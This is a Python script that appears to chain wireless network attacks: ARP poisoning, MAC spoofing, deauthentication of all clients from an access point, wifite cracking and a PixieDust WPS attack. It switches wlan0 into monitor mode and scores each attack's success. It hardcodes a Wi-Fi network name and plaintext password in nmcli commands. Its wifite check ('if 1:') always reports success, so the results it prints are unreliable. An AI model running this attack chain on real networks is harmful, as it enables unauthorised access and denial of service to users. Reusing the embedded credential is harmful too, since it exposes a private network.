import os
import subprocess
import time
from subprocess import check_call
from wireless import Wireless
from ARPPoise import *
from Deauth import *
from MacSpoofing import *
from PixieDust import *
from pingsweeper import *
from portsniffer import *

######## Evaluation Variables Initialization ########
atk1 = atk2 = atk3 = atk4 = atk5 = 0

######## Setting up adapters ########

print("\nScanning Hardware for Wireless Adapters")
wireless = Wireless()
wireless.interfaces()
os.system("netstat -i")

######## Attack 1 : ARP #########
var=arp()
if  var == 1:
    atk1=1
    print("\nARP Poisoning Successful\n")
else:
    print("\nARP Poisoning Failed")

######## Attack 2 : MAC #########
var=macspoofing()
if  var == 1:
    atk2=1
    print("\nMac Spoofing Successful\n")
else:
    print("\nMac Spoofing Failed\n")

os.system("nmcli d wifi connect Frosty password bisaat1853# ifname wlan0")    

######## Change Interface Mode ########

print("\nPutting wireless interface wlan0 in Monitor mode\n")
order = "sudo airmon-ng start wlan0 && sudo airmon-ng check kill"
os.system(order)

######## Attack 3 : Deauth #########
var=deauth()
if  var == 1:
    atk3=1
    print("\nAll Clients kicked off the Access Point\n")
else:
    print("\nDeauthentication Failed\n")

######## Attack 4 : Wifite #########
cmd = os.system("wifite")
if  1:
    atk4=1
    print("\nCracking Successful\n")
else:
    print("\nWifite Failed\n")

######## Attack 5 : PixieDust #########
var=pixie()
if  var == 1:
    atk5=1
    print("\nPixieDust Successful\n")
else:
    print("\nPixieDust Failed\n")

######## Change Interface Mode ########

print("\nPutting wireless interface wlan0 in Manage mode\n")
order = "sudo airmon-ng stop wlan0mon && sudo service network-manager restart"
os.system(order)
os.system("nmcli d wifi connect Frosty password bisaat1853# ifname wlan0") 

print(atk1,"\n",atk2,"\n",atk3,"\n",atk4,"\n",atk5,"\n")    